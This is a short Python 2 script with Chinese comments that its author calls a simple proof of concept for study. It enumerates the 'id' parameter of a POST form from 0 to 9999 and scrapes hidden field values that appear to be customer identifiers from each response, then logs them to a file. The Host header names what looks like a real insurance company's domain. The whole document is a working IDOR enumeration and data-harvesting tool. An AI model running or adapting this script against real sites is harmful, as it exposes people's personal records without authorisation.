#!/win/python2.7
# -*- coding: UTF-8 -*-
# by xt.
# 日常，仅供学习交流。xt.
#
# 功能描述：
#	实现一个简单的poc
# 	实现对下列类型普通post的某参数的简单payload应用
#	实现提交payload之后抓取页面标签关键数据
#	实现对数据格式化输出
# 可完善功能：
#	payload交互
#	payload 引用file，并参数化
#	http，https兼容性
#	等等
#
"""
POST /target_post_position HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
Referer: http://target.com/something_referer
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

id=92&empMobile=0&mobile=0
"""
# ---------code start--------------
import urllib,urllib2
from bs4 import BeautifulSoup
import time
import sys
reload(sys)
sys.setdefaultencoding('utf-8')



# config
# 这里简单的payload 0-9999，payload_max就是最大值
payload_max=9999






# init 初始化
target="http://target_post_position"
header={"Host": "qyh.bocommlife.com",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "zh-CN",
"Accept-Encoding": "gzip, deflate",
"Referer": "http://target.com/something_referer",
"Content-Type": "application/x-www-form-urlencoded",
"Connection": "close",
"Upgrade-Insecure-Requests": "1"}
data=time.strftime('testlog '+'%Y-%m-%d',time.localtime(time.time()))
file_object = open(data+'.txt','w')
file_object.close()
text=""






# function 函数
def getHtml(reurl,payload_id):
    #testdata为post数据
    testdata=TestDATA = {'id': payload_id,'empMobile': '0','mobile':'0'}
    testdata = urllib.urlencode(TestDATA)
    req=urllib2.Request(url=reurl,headers=header,data=testdata)
    page=urllib2.urlopen(req)
    html=page.read().decode('utf-8')
    print page.getcode(),
    return html
#
# 这里主逻辑：post请求，判断是否包含报错error_tag标签，如果不包括则提取repones中input标签并且id="firstid"以及id="secondid"的值；如果包含error_tag则获取error_tag的text内容
#
def getresult(payload_num):
    print payload_num,
    response=getHtml(target,payload_num)
    soup=BeautifulSoup(response,'lxml')
    try:
        #test_input=soup.findAll('input')
        id_secondid=soup.find(id='secondid')["value"]
        print id_secondid,
        id_customer=soup.find(id='firstid')["value"]
        text=id_secondid+' '+id_customer
        print id_customer
    except:
        try:
            test_error_tag=soup.find('error_tag').text
            print test_error_tag
        except:
            print ""
            pass
    else:
        file_object2 = open(data+'.txt', 'a+')
        file_object2.write(str(payload_num)+' '+text+'\n')
        file_object2.close()
        print text




# main 主程序
#
# 生成payload list，
for num in range(payload_max):
    getresult(num)
